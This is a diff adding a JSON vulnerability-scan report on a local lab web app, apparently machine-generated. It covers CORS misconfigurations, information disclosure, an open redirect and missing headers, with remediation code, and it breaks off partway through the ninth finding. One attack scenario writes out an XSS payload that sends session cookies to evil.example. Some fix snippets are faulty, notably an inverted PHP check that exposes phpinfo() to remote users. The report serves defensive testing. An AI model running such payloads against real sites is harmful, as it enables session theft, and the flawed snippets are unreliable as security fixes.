@@ -1,0 +1,754 @@
+{
+  "tool": "redveil",
+  "version": "0.1.0",
+  "generated_at": "2026-08-31T22:07:11.427628+00:00",
+  "target": "Local Lab",
+  "findings_count": 14,
+  "findings": [
+    {
+      "id": "WPOC-11749D",
+      "check": {
+        "id": "cors-policy",
+        "name": "CORS Policy Check",
+        "version": "0.1.0",
+        "category": "cors"
+      },
+      "title": "CORS Origin Reflection Without Validation",
+      "severity": "high",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/api/data",
+        "method": "OPTIONS",
+        "parameter": "Origin"
+      },
+      "parameter": "Origin",
+      "input_used": "https://evil.example",
+      "summary": "The server echoes whatever value the client sends in the `Origin` header back into `Access-Control-Allow-Origin`, with no allowlist check. This is functionally equivalent to setting the origin to `*` but also defeats the browser's refusal to combine `*` with credentials \u2014 meaning a cross-origin attacker can read responses in the victim's authenticated session.",
+      "technical_explanation": "Origin reflection is a common anti-pattern: the server reads the incoming `Origin` header and copies it verbatim into `Access-Control-Allow-Origin`. Without an allowlist check, this permits any origin. Because the browser sees a specific origin in ACAO (not `*`), it will honor `Access-Control-Allow-Credentials: true` and include cookies on the request. The result: an attacker-controlled page can issue credentialed XHR to your API and read the responses as if it were the legitimate origin.",
+      "impact": "Full cross-origin data theft from any authenticated endpoint that reflects origin. With credentialed requests honored, this is the practical equivalent of disabling the same-origin policy for those endpoints. Attackers can read PII, perform state-changing actions on behalf of the victim, and exfiltrate session tokens.",
+      "evidence_ids": [
+        "EV-ab494771",
+        "EV-ab3160dd"
+      ],
+      "reproduction": [
+        {
+          "step": 1,
+          "description": "Send an OPTIONS preflight to http://127.0.0.1:5000/api/data with Origin: https://evil.example.",
+          "request": "curl -X OPTIONS -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: GET' http://127.0.0.1:5000/api/data"
+        },
+        {
+          "step": 2,
+          "description": "Observe Access-Control-Allow-Origin: https://evil.example"
+        }
+      ],
+      "remediation": [
+        "Replace origin reflection with an explicit allowlist. Compare the incoming Origin against a hard-coded set of trusted origins and only set ACAO if it matches.",
+        "Never reflect arbitrary input into security headers without validation. Treat Origin like any other user-supplied value: validate, then output.",
+        "If multiple origins need access, return the specific matching origin per request (do not echo arbitrary input).",
+        "Add `Vary: Origin` to prevent cache poisoning between origins."
+      ],
+      "cwe": [
+        "CWE-942",
+        "CWE-346"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
+        "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"
+      ],
+      "attack_scenario": "1. Attacker hosts https://evil.example\n2. JavaScript on evil.example issues a credentialed fetch to https://target.example/api/me with the victim's cookies\n3. Browser sends the request with cookies; Origin: https://evil.example\n4. Server responds: `Access-Control-Allow-Origin: https://evil.example` and `Access-Control-Allow-Credentials: true`\n5. Browser permits evil.example to read the response, which contains the victim's profile data\n6. Attacker exfiltrates the data \u2014 full account takeover if the response includes a session token",
+      "code_examples": {
+        "nginx": "map $http_origin $cors_allow {\n    default \"\";\n    \"https://app.example.com\" \"https://app.example.com\";\n    \"https://admin.example.com\" \"https://admin.example.com\";\n}\nadd_header Access-Control-Allow-Origin $cors_allow always;\nadd_header Vary \"Origin\" always;\n# NEVER: add_header Access-Control-Allow-Origin $http_origin;",
+        "apache": "SetEnvIf Origin \"^https://(app|admin)\\.example\\.com$\" CORS_OK\nHeader set Access-Control-Allow-Origin \"%{CORS_OK}e\" env=CORS_OK\nHeader merge Vary \"Origin\"\n# NEVER: Header set Access-Control-Allow-Origin \"%{Origin}e\"",
+        "express": "const ALLOW = new Set(['https://app.example.com']);\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (origin && ALLOW.has(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n    res.setHeader('Vary', 'Origin');\n  }\n  next();\n});\n# NEVER: res.setHeader('Access-Control-Allow-Origin', req.headers.origin);",
+        "flask": "ALLOW = {'https://app.example.com'}\n@app.after_request\ndef cors(resp):\n    o = flask.request.headers.get('Origin')\n    if o in ALLOW:\n        resp.headers['Access-Control-Allow-Origin'] = o\n        resp.headers['Vary'] = 'Origin'\n    return resp",
+        "django": "def cors_allow(request):\n    origin = request.META.get('HTTP_ORIGIN')\n    if origin in ALLOWED_ORIGINS:\n        response['Access-Control-Allow-Origin'] = origin\n        response['Vary'] = 'Origin'\n    return response"
+      },
+      "discovered_at": "2026-08-31T22:06:31.078813Z"
+    },
+    {
+      "id": "WPOC-05A92C",
+      "check": {
+        "id": "cors-policy",
+        "name": "CORS Policy Check",
+        "version": "0.1.0",
+        "category": "cors"
+      },
+      "title": "Wildcard CORS Origin Combined With Credentials",
+      "severity": "critical",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/api/data",
+        "method": "OPTIONS",
+        "parameter": "Origin"
+      },
+      "parameter": "Origin",
+      "input_used": "https://evil.example",
+      "summary": "The server sets both `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`. Modern browsers refuse to honor this combination, but misconfigured CDNs, reverse proxies, or non-browser clients can strip the wildcard check and treat the configuration as if any origin is allowed with credentials. This is a CRITICAL misconfiguration.",
+      "technical_explanation": "Per the CORS specification, the `*` wildcard is incompatible with `Access-Control-Allow-Credentials: true`. Browsers refuse to send or honor the response, returning a console error. However, middleware that strips the credentials header (or that does not know about the CORS spec \u2014 older proxies, CDNs in legacy mode, non-browser HTTP clients) may still apply the wildcard and successfully process credentialed requests. The result is the same as origin reflection but is harder to detect because the origin 'mismatch' is invisible to the client.",
+      "impact": "Critical credentialed data exposure. When the spec is enforced the impact is reduced to a console error, but any environment where the spec is not enforced \u2014 a CDN, a proxy, an embedded WebView, a native mobile client \u2014 is exposed. This is a recurring real-world finding in bug bounty programs precisely because it survives the standard browser defenses.",
+      "evidence_ids": [
+        "EV-599c3b8e",
+        "EV-ad647ca4"
+      ],
+      "reproduction": [
+        {
+          "step": 1,
+          "description": "Send an OPTIONS preflight to http://127.0.0.1:5000/api/data with Origin: https://evil.example.",
+          "request": "curl -X OPTIONS -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: GET' http://127.0.0.1:5000/api/data"
+        },
+        {
+          "step": 2,
+          "description": "Observe Access-Control-Allow-Origin: *"
+        }
+      ],
+      "remediation": [
+        "Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Replace `*` with an explicit allowlist of trusted origins.",
+        "Audit the full stack \u2014 CDN, reverse proxy, load balancer \u2014 for places where the CORS spec enforcement is bypassed.",
+        "If you need credentialed CORS, respond with the specific matching origin (after allowlist check) and set credentials to true only for that origin.",
+        "Use Content-Security-Policy to further restrict which origins can frame or include your content."
+      ],
+      "cwe": [
+        "CWE-942"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
+        "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"
+      ],
+      "attack_scenario": "1. Application behind a CDN that strips ACAO credentials mismatch checks (or a non-browser client like a mobile app using a WebView that doesn't enforce the spec)\n2. Backend sets `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`\n3. Attacker hosts https://evil.example and uses a non-standard client or bypass to issue credentialed XHR\n4. CDN forwards the request with the victim's cookies; backend responds with `*` and credentials\n5. Attacker reads the response\nOr simpler: the application is served from both a browser context (where the spec protects) and a non-browser context (where it doesn't) \u2014 attacker exploits the latter",
+      "code_examples": {
+        "nginx": "# NEVER do this:\n# add_header Access-Control-Allow-Origin \"*\" always;\n# add_header Access-Control-Allow-Credentials \"true\" always;\n# Use a specific origin instead:\nmap $http_origin $cors_allow {\n    default \"\";\n    \"https://app.example.com\" \"https://app.example.com\";\n}\nadd_header Access-Control-Allow-Origin $cors_allow always;\nadd_header Access-Control-Allow-Credentials \"true\" always;",
+        "apache": "# Use SetEnvIf to restrict and never set ACAO to literal \"*\"\nSetEnvIf Origin \"^https://app\\.example\\.com$\" CORS_OK\nHeader set Access-Control-Allow-Origin \"%{CORS_OK}e\" env=CORS_OK\nHeader set Access-Control-Allow-Credentials \"true\" env=CORS_OK",
+        "express": "const ALLOW = ['https://app.example.com'];\napp.use((req, res, next) => {\n  if (ALLOW.includes(req.headers.origin)) {\n    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n    res.setHeader('Access-Control-Allow-Credentials', 'true');\n    res.setHeader('Vary', 'Origin');\n  }\n  next();\n});",
+        "flask": "from flask_cors import CORS\nCORS(app, origins=['https://app.example.com'], supports_credentials=True)",
+        "django": "CORS_ALLOWED_ORIGINS = ['https://app.example.com']\nCORS_ALLOW_CREDENTIALS = True  # with specific origins only"
+      },
+      "discovered_at": "2026-08-31T22:06:31.084179Z"
+    },
+    {
+      "id": "WPOC-84EB7E",
+      "check": {
+        "id": "information-disclosure",
+        "name": "Information Disclosure Check",
+        "version": "0.1.0",
+        "category": "disclosure"
+      },
+      "title": "Version Disclosure in Server Header",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "server",
+      "input_used": "Werkzeug/3.1.8 Python/3.13.5",
+      "summary": "The response includes a `Server` or `X-Powered-By` header that discloses the exact software version (e.g. `nginx/1.18.0`, `Express`, `PHP/7.4.3`). Public vulnerability databases index every version of every web server; advertising yours lets an attacker look up CVEs that match your stack without doing any reconnaissance themselves.",
+      "technical_explanation": "Web servers and frameworks often auto-add headers identifying themselves. `Server` is set by Apache, nginx, IIS. `X-Powered-By` is set by PHP, ASP.NET, Express. Exact version strings are even more valuable than names. Tools like Shodan, Censys, and vulnerability scanners ingest these headers at scale to build asset inventories and CVE match lists. Removing the version (or the header entirely) gives an attacker one more step to perform before they can target specific CVEs.",
+      "impact": "Faster, more reliable target identification by adversaries. Specific CVEs can be matched to your stack without active probing. In large-scale attacks (botnets, worms), version-specific exploits are launched automatically. Disclosing versions also signals to attackers whether you're running an outdated stack \u2014 a strong indicator of broader security hygiene issues.",
+      "evidence_ids": [
+        "EV-e638d2a6"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Set `server_tokens off;` in nginx to remove the version from the Server header.",
+        "In Apache, set `ServerTokens Prod` (and `ServerSignature Off`) to emit only `Server: Apache`.",
+        "In Express, call `app.disable('x-powered-by')` to remove `X-Powered-By: Express`.",
+        "In IIS, configure `removeServerHeader=true` via web.config.",
+        "Strip or rewrite these headers at the reverse proxy as a defense-in-depth measure."
+      ],
+      "cwe": [
+        "CWE-200"
+      ],
+      "owasp": [
+        "A01:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker runs a port scan on the target's IP range\n2. Server responds with `Server: nginx/1.14.0`\n3. Attacker searches `https://vulners.com/search?query=nginx+1.14.0` and discovers CVE-2019-20372 (error_page request smuggling)\n4. Attacker checks the target's exact version against the CVE's affected list \u2014 match\n5. Attacker fires off the exploit without further recon\nWithout the version, the attacker would have to fingerprint manually or try broader exploits",
+      "code_examples": {
+        "nginx": "server_tokens off;  # in http {} or server {} block",
+        "apache": "ServerTokens Prod\nServerSignature Off",
+        "express": "const app = express();\napp.disable('x-powered-by');",
+        "iis": "<!-- web.config -->\n<system.webServer>\n  <security>\n    <requestFiltering removeServerHeader=\"true\" />\n  </security>\n</system.webServer>",
+        "flask": "@app.after_request\ndef strip_server(resp):\n    resp.headers.pop('Server', None)\n    resp.headers.pop('X-Powered-By', None)\n    return resp"
+      },
+      "discovered_at": "2026-08-31T22:06:56.592884Z"
+    },
+    {
+      "id": "WPOC-79FBB9",
+      "check": {
+        "id": "information-disclosure",
+        "name": "Information Disclosure Check",
+        "version": "0.1.0",
+        "category": "disclosure"
+      },
+      "title": "Exposed Debug Endpoint",
+      "severity": "high",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/debug",
+        "method": "GET"
+      },
+      "parameter": "body",
+      "input_used": "/debug",
+      "summary": "A debug endpoint (`/debug`, `/api/_debug`, `/admin/debug`) is reachable without authentication and returns runtime internals \u2014 Python version, Flask routes, environment variables, active sessions, sometimes even direct database access. Debug endpoints are intended for development and should never be exposed in production.",
+      "technical_explanation": "Debug endpoints are commonly added by frameworks in development mode (Flask `/debug`, Django Debug Toolbar) or by developers as a quick way to inspect application state. They return rich internal data: route maps, environment variables, request context, database queries, sometimes even admin actions. Werkzeug's interactive debugger (when `debug=True`) is a remote code execution vulnerability if exposed \u2014 the debugger console accepts arbitrary Python code. Even non-interactive debug endpoints leak enough information to mount targeted attacks.",
+      "impact": "Critical disclosure of internal state. At minimum, route maps and config reveal attack surface; at worst, exposed debug endpoints enable remote code execution (Werkzeug, Tornado, Rails `better_errors`). Even a benign debug page that returns request headers can leak Authorization tokens if a downstream service forwards them.",
+      "evidence_ids": [
+        "EV-1d24d350"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Remove or disable all debug endpoints in production: in Flask, `app.debug = False` and `use_debugger = False`.",
+        "Add an environment-based guard: only register the debug blueprint when `app.config['ENV'] == 'development'`.",
+        "Block access at the reverse proxy: `location /debug { deny all; }`.",
+        "Audit route maps for `/debug`, `/_debug`, `/admin/debug`, `/__debug__`, and similar patterns."
+      ],
+      "cwe": [
+        "CWE-200"
+      ],
+      "owasp": [
+        "A01:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker runs a directory brute force and finds `/debug` returning 200\n2. Response contains the full route map (every URL the app serves), Flask version, all environment variables including API keys, and the Python version\n3. Attacker maps the route list to known CVEs for that framework version\n4. Attacker reads API keys from env vars and uses them to access the database, payment processor, or cloud provider\n5. With Werkzeug debug enabled, attacker executes arbitrary Python in the application context \u2014 full RCE",
+      "code_examples": {
+        "flask": "if app.config['ENV'] == 'development':\n    from myapp.debug import debug_bp\n    app.register_blueprint(debug_bp)\n# Werkzeug debugger: never enable in production\napp.run(debug=False)",
+        "django": "# settings.py\nDEBUG = False\n# Never install django-debug-toolbar in production\n# INSTALLED_APPS should not contain 'debug_toolbar'",
+        "express": "if (process.env.NODE_ENV !== 'production') {\n  app.get('/debug', require('./routes/debug'));\n}",
+        "nginx": "location ~ ^/(debug|_debug|admin/debug|__debug__) {\n    deny all;\n    return 404;\n}",
+        "generic": "# CI check:\ngrep -rn 'app.run(.*debug' src/ && exit 1\ngrep -rn '/debug' src/routes/ && exit 1"
+      },
+      "discovered_at": "2026-08-31T22:06:56.626161Z"
+    },
+    {
+      "id": "WPOC-E7D420",
+      "check": {
+        "id": "information-disclosure",
+        "name": "Information Disclosure Check",
+        "version": "0.1.0",
+        "category": "disclosure"
+      },
+      "title": "Exposed Management Panel",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/server-status",
+        "method": "GET"
+      },
+      "parameter": "body",
+      "input_used": "/server-status",
+      "summary": "A management or status panel (`/server-status`, `/server-info`, `/phpinfo.php`) is publicly accessible. These panels reveal active connections, request logs, server configuration, and loaded modules. Apache `server-status` is a frequent find \u2014 it lists every recent request including URLs that may not be linked from the main site.",
+      "technical_explanation": "Apache `mod_status` exposes `/server-status` showing recent requests, worker status, and connection counts. `/server-info` lists every loaded module with version info. PHP `phpinfo()` dumps every PHP setting, environment variable, and module \u2014 a goldmine for attackers. These endpoints are often enabled by default in development configurations and accidentally deployed to production.",
+      "impact": "Reconnaissance shortcut. Apache `server-status` lists recent requests including those to admin or internal endpoints. `phpinfo()` leaks the full PHP configuration including credentials, document root, and library versions. Once an attacker has these, every subsequent attack is targeted rather than blind.",
+      "evidence_ids": [
+        "EV-38aca466"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Disable Apache `mod_status` or restrict it to localhost: `<Location /server-status> Require ip 127.0.0.1 </Location>`.",
+        "Remove `phpinfo.php` from production; never deploy it.",
+        "Block these paths at the reverse proxy: `location ~ ^/(server-status|server-info|phpinfo\\.php) { deny all; }`.",
+        "Audit your `httpd.conf` for `SetHandler server-status` and your codebase for `phpinfo()` calls."
+      ],
+      "cwe": [
+        "CWE-200"
+      ],
+      "owasp": [
+        "A01:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker requests `/server-status` \u2014 Apache returns the last 100 requests including IPs, URLs, and user agents\n2. Attacker discovers URLs not linked anywhere on the site: `/admin/legacy-import`, `/internal/sync`, `/api/v2/debug`\n3. Attacker enumerates these hidden endpoints for further vulnerabilities\n4. `/phpinfo.php` reveals `DOCUMENT_ROOT`, `_SERVER['SERVER_ADMIN']`, the loaded PHP extensions and versions \u2014 direct CVE matching\n5. Attacker now has a complete map of the server's attack surface",
+      "code_examples": {
+        "apache": "<Location \"/server-status\">\n    SetHandler server-status\n    Require local  # or Require ip 127.0.0.1\n</Location>\n<Location \"/server-info\">\n    SetHandler server-info\n    Require local\n</Location>",
+        "nginx": "location ~ ^/(server-status|server-info|phpinfo\\.php) {\n    deny all;\n    return 404;\n}",
+        "php": "# Search and remove phpinfo() calls:\ngrep -rn 'phpinfo()' src/ public/ && exit 1\n# Or guard with:\nif (\\$_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { phpinfo(); }",
+        "deployment": "# CI check: ensure phpinfo.php never lands in production\ntest ! -f /var/www/html/phpinfo.php",
+        "flask": "# Never expose Werkzeug's interactive debugger:\napp.run(debug=False, host='127.0.0.1')"
+      },
+      "discovered_at": "2026-08-31T22:06:56.637362Z"
+    },
+    {
+      "id": "WPOC-1C2A6D",
+      "check": {
+        "id": "information-disclosure",
+        "name": "Information Disclosure Check",
+        "version": "0.1.0",
+        "category": "disclosure"
+      },
+      "title": "Exposed Source Map File",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/api/source-map",
+        "method": "GET"
+      },
+      "parameter": "body",
+      "input_used": "/api/source-map",
+      "summary": "A JavaScript source map file (`*.js.map`) is publicly accessible. Source maps translate minified production code back to the original source \u2014 including comments, internal variable names, and unreleased features. An attacker who fetches the map sees your application as if it were open source.",
+      "technical_explanation": "Modern build tools (Webpack, Vite, esbuild, Rollup) generate source maps by default. They map positions in the minified production bundle back to lines in the original TypeScript or JavaScript. The `sourcesContent` array in the map contains the full original source. When deployed, attackers fetch the map and reconstruct comments, function names, dead code paths, and internal API URLs. Source maps should never be deployed to production \u2014 they should only be uploaded to error-tracking services (Sentry, Bugsnag) for stack-trace symbolication.",
+      "impact": "Full source code disclosure of the JavaScript bundle. While the minified code is already public (the bundle ships to every browser), the source map adds comments, variable names, and internal structure. Common leaks: API keys committed by developers, internal-only endpoints, hard-coded test credentials, comments referencing planned security controls or known issues. For applications with TypeScript types, the map can reveal the entire type system.",
+      "evidence_ids": [
+        "EV-5b8e4eb0"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Do not deploy source maps to production. In Webpack: `devtool: 'hidden-source-map'` uploads the map to your error tracker but does not reference it from the bundle.",
+        "Or strip the `sourceMappingURL` comment from the production output: `devtool: false` or use `TerserPlugin` with `sourceMap: false`.",
+        "Block `.map` files at the web server: `location ~* \\.map$ { deny all; return 404; }`.",
+        "If source maps must be accessible for debugging, restrict access via authentication or a private CDN accessible only to your error-tracking service."
+      ],
+      "cwe": [
+        "CWE-200"
+      ],
+      "owasp": [
+        "A01:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker loads the application, opens DevTools, finds `/static/js/main.bundle.js`\n2. Attacker fetches `/static/js/main.bundle.js.map` \u2014 returns 200 OK\n3. Attacker reads the `sourcesContent` array \u2014 full original TypeScript source\n4. Attacker finds comments like `// TODO: remove admin backdoor in v2.5`, internal endpoint URLs (`/api/internal/users`), hard-coded test credentials, or feature flags for unreleased features\n5. Attacker exploits the discovered information \u2014 calls the internal endpoint, uses the credentials, or accesses an unfinished feature",
+      "code_examples": {
+        "webpack": "// webpack.config.js\nmodule.exports = {\n  // Production: do not bundle source map into output\n  devtool: false,\n  // Or: upload to Sentry without serving to clients\n  devtool: 'hidden-source-map',\n  plugins: [new SentryWebpackPlugin({ ... })],\n};",
+        "vite": "// vite.config.ts\nexport default defineConfig({\n  build: {\n    sourcemap: false,  // or 'hidden' for error tracker only\n  }\n});",
+        "nginx": "location ~* \\.map$ {\n    deny all;\n    return 404;\n}",
+        "apache": "<FilesMatch \"\\.map$\">\n    Require all denied\n</FilesMatch>",
+        "express": "app.use((req, res, next) => {\n  if (/\\.map$/.test(req.path)) return res.status(404).end();\n  next();\n});"
+      },
+      "discovered_at": "2026-08-31T22:06:56.647776Z"
+    },
+    {
+      "id": "WPOC-9651D6",
+      "check": {
+        "id": "open-redirect-indicator",
+        "name": "Open Redirect Indicator",
+        "version": "0.1.0",
+        "category": "redirect"
+      },
+      "title": "Potential Open Redirect via 'to' Parameter",
+      "severity": "low",
+      "confidence": "low",
+      "status": "likely",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/redirect",
+        "method": "GET",
+        "parameter": "to"
+      },
+      "parameter": "to",
+      "input_used": "https://example.com",
+      "summary": "An endpoint accepts a redirect-target parameter (`next`, `url`, `redirect`, `return`, `goto`, etc.) without server-side validation. If exploited, an attacker can craft a link on the trusted domain that redirects victims to a phishing or malware site \u2014 bypassing URL filters and user trust signals.",
+      "technical_explanation": "Open redirects exploit authentication flows that use a `returnTo` or `next` parameter after login. The application redirects to whatever URL the user supplies, with no validation. Because the initial URL is on the trusted domain, link previewers and email scanners see only the trusted host. The victim clicks, is briefly redirected to the trusted domain, then sent to the attacker's site. Open redirects are routinely used in OAuth flows to hijack authorization codes, in phishing campaigns to make links look legitimate, and in tab-nabbing scenarios.",
+      "impact": "Phishing leverage: any link on the trusted domain can land the victim on an attacker-controlled page. OAuth flow abuse: if the OAuth `redirect_uri` is not validated, the attacker captures the authorization code. Tab-nabbing: a link opened in a new tab can rewrite the original tab via window.opener. The combination with OAuth is the most damaging \u2014 full account takeover via stolen authorization code.",
+      "evidence_ids": [
+        "EV-123eb030"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Validate redirect targets against an allowlist of internal paths (e.g. only redirect to paths starting with `/` on your own domain).",
+        "Use signed/encrypted tokens for redirect targets so the URL itself cannot be modified by an attacker.",
+        "If external redirects are needed, present an interstitial page warning the user they are leaving the trusted domain.",
+        "For OAuth, validate `redirect_uri` strictly \u2014 only allow pre-registered URIs; reject wildcards and partial matches."
+      ],
+      "cwe": [
+        "CWE-601"
+      ],
+      "owasp": [
+        "A01:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker crafts `https://target.example/login?next=https://evil.example/fake-login`\n2. Attacker distributes the link: 'Click here to verify your account on target.example'\n3. Victim clicks, lands on target.example's real login page, enters credentials, gets redirected to evil.example\n4. evil.example renders a target.example lookalike saying 'Session expired, please re-enter your password'\n5. Victim enters credentials \u2014 captured by attacker\n6. Attacker uses credentials to log in to the real target.example \u2014 account takeover",
+      "code_examples": {
+        "flask": "from urllib.parse import urlparse\nALLOWED_HOSTS = {'target.example.com'}\n@app.route('/login')\ndef login():\n    next_url = request.args.get('next', '/')\n    p = urlparse(next_url)\n    if p.scheme or p.netloc:  # absolute URL \u2014 reject\n        return 'invalid redirect', 400\n    if not next_url.startswith('/'):\n        next_url = '/' + next_url\n    return redirect(next_url)",
+        "django": "from django.utils.http import url_has_allowed_host_and_scheme\ndef safe_redirect(request):\n    nxt = request.GET.get('next', '/')\n    if url_has_allowed_host_and_scheme(nxt, allowed_hosts={request.get_host()}, require_https=request.is_secure()):\n        return redirect(nxt)\n    return redirect('/')",
+        "express": "function safeRedirect(req, res, next) {\n  const nxt = req.query.next || '/';\n  if (/^\\/[\\w/-]*$/.test(nxt)) {\n    return res.redirect(nxt);\n  }\n  return res.redirect('/');\n}",
+        "oauth": "# OAuth: validate redirect_uri strictly\nALLOWED_REDIRECTS = {'https://app.example.com/callback'}\nif redirect_uri not in ALLOWED_REDIRECTS:\n    return error('invalid redirect_uri')",
+        "interstitial": "# If external redirects must be allowed, use an interstitial:\n<a href=\"/leave?u=https://external.example\">Leave site</a>\n# /leave renders: 'You are about to visit https://external.example'"
+      },
+      "discovered_at": "2026-08-31T22:06:59.085895Z"
+    },
+    {
+      "id": "WPOC-53C1BC",
+      "check": {
+        "id": "security-headers",
+        "name": "Security Headers Check",
+        "version": "0.1.0",
+        "category": "headers"
+      },
+      "title": "Missing Content-Security-Policy Header",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "content-security-policy",
+      "input_used": "(not set)",
+      "summary": "The Content-Security-Policy header is absent, leaving the application without a server-side policy that defines which scripts, styles, images, frames, and connections the browser should trust. Without CSP, any XSS bug becomes immediately exploitable and the blast radius of a single injection grows.",
+      "technical_explanation": "Content-Security-Policy is a defense-in-depth header that whitelists the origins from which resources can be loaded and inline content that can execute. Modern browsers enforce CSP at parse time: a script tag whose source does not match the policy is blocked before it runs. CSP cannot fix an XSS bug, but it raises the cost of exploitation by forcing an attacker to either find a JSONP endpoint, abuse an allowed CDN, or compromise an allowed origin. Absent CSP, every stored, reflected, or DOM-based XSS sinks directly into the user's session.",
+      "impact": "Without CSP every XSS vulnerability is a direct credential theft or account takeover vector. CSP also limits the impact of clickjacking (via `frame-ancestors`), mixed-content issues (via `block-all-mixed-content`), and unauthorized iframe embedding. Absence of CSP increases the severity of any other client-side vulnerability and is a meaningful compliance gap (PCI-DSS, NIST 800-53 SC-18).",
+      "evidence_ids": [
+        "EV-088e8b38"
+      ],
+      "reproduction": [],
+      "remediation": [
+        "Add a strict CSP starting with `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'`.",
+        "Avoid `unsafe-inline` and `unsafe-eval` \u2014 they disable the primary XSS-mitigation benefit of CSP. If you must allow inline scripts, switch to nonces or hashes (`script-src 'nonce-{random}'`).",
+        "Deploy in Report-Only mode first (`Content-Security-Policy-Report-Only`) to collect violations before enforcing.",
+        "Use `report-uri` or `report-to` to send violation reports to a logging endpoint for monitoring."
+      ],
+      "cwe": [
+        "CWE-1021"
+      ],
+      "owasp": [
+        "A05:2021"
+      ],
+      "references": [],
+      "attack_scenario": "1. Attacker discovers a reflected XSS in https://target.example/search?q=\n2. Attacker crafts a link `https://target.example/search?q=<script>fetch('//evil.example/?c='+document.cookie)</script>`\n3. Attacker distributes the link via email, Slack, or social media\n4. Victim clicks the link while authenticated to target.example\n5. With CSP absent, the inline <script> executes and exfiltrates the session cookie to evil.example\n6. Attacker replays the cookie and impersonates the victim\nWith a strict CSP (e.g. `script-src 'self'`) the inline script is blocked at parse time and the attack fails",
+      "code_examples": {
+        "nginx": "add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'\" always;",
+        "apache": "Header always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'",
+        "express": "const helmet = require('helmet');\napp.use(helmet.contentSecurityPolicy({\n  directives: {\n    defaultSrc: [\"'self'\"],\n    scriptSrc: [\"'self'\"],\n    objectSrc: [\"'none'\"],\n    frameAncestors: [\"'none'\"],\n  }\n}));",
+        "flask": "from flask_talisman import Talisman\nTalisman(app, content_security_policy={\n    'default-src': \"'self'\",\n    'script-src': \"'self'\",\n    'object-src': \"'none'\",\n    'frame-ancestors': \"'none'\"\n})",
+        "django": "# settings.py\nCSP_DEFAULT_SRC = (\"'self'\",)\nCSP_SCRIPT_SRC = (\"'self'\",)\nCSP_OBJECT_SRC = (\"'none'\",)\nCSP_FRAME_ANCESTORS = (\"'none'\",)\n# install django-csp and add its middleware"
+      },
+      "discovered_at": "2026-08-31T22:06:59.585054Z"
+    },
+    {
+      "id": "WPOC-E0FBC4",
+      "check": {
+        "id": "security-headers",
+        "name": "Security Headers Check",
+        "version": "0.1.0",
+        "category": "headers"
+      },
+      "title": "Missing X-Frame-Options Header",
+      "severity": "medium",
+      "confidence": "high",
+      "status": "confirmed",
+      "target": {
+        "host": "127.0.0.1",
+        "port": 5000,
+        "scheme": "http",
+        "endpoint": "/",
+        "method": "GET"
+      },
+      "parameter": "x-frame-options",
+      "input_used": "(not set)",
+      "summary": "The X-Frame-Options header is not set, which means the response can be embedded inside a <frame>, <iframe>, <embed>, or <object> on any other website. This enables clickjacking attacks where victims are tricked into clicking hidden elements rendered in their authenticated session.",
+      "technical_explanation": "Browsers consult the X-Frame-Options header (and the modern Content-Security-Policy ``frame-ancestors`` directive) to decide whether a page may be rendered inside a frame on another origin. When neither is present, browsers default to allowing framing from any origin. An attacker hosts your application inside an invisible iframe overlaid with attacker-controlled UI; the victim interacts with the framed page believing they are interacting with the attacker's surface, but every action executes inside their authenticated session on your application.",
+      "impact": "Clickjacking can be used to trick users into making unwanted financial transfers, changing account settings (recovery email, password, 2FA), granting OAuth or app permissions, deleting data, or following/unfollowing accounts. Severity escalates significantly when the framed page contains state-changing forms and the application lacks CSRF protection, because the click is interpreted as an intentional user action.",
+      "evidence_ids": [
+        "EV-bc0cb22c"
+      ],
+      "reproduction": [],
+      "remediation": [
